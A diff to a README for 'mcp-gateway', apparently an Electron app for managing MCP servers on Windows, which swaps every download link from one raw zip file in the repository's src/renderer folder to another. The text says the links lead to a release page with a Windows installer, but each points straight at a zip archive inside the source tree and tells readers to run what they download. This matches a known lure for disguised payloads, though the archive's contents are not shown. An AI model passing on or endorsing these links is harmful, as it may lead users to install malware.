@@ -1,6 +1,6 @@
 # ⚙️ mcp-gateway - Manage MCP Servers Locally and Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download-mcp--gateway-blue)](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/gateway-mcp-v3.8.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-mcp--gateway-blue)](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/mcp-gateway-2.2.zip)
 
 ## 🖥️ What is mcp-gateway?
 
@@ -38,7 +38,7 @@ Follow these steps to download and run mcp-gateway on your Windows PC.
 
 Click the big blue button below to visit the download page. This page has the latest version of mcp-gateway for Windows.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-mcp--gateway-blue)](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/gateway-mcp-v3.8.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-mcp--gateway-blue)](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/mcp-gateway-2.2.zip)
 
 On the GitHub page, look for the latest release section or files. Download the Windows installer or executable file available there. The file name will usually end with `.exe`.
 
@@ -101,6 +101,6 @@ mcp-gateway is built as a desktop app using Electron. This means it runs well on
 
 Access the latest version and more information here:
 
-[https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/gateway-mcp-v3.8.zip](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/gateway-mcp-v3.8.zip)
+[https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/mcp-gateway-2.2.zip](https://github.com/7j89a/mcp-gateway/raw/refs/heads/main/src/renderer/mcp-gateway-2.2.zip)
 
 Use this page to download the app, read release notes, and get help. You will find the Windows installer or executable in the latest release section. Save the file and then run it to install mcp-gateway on your PC.
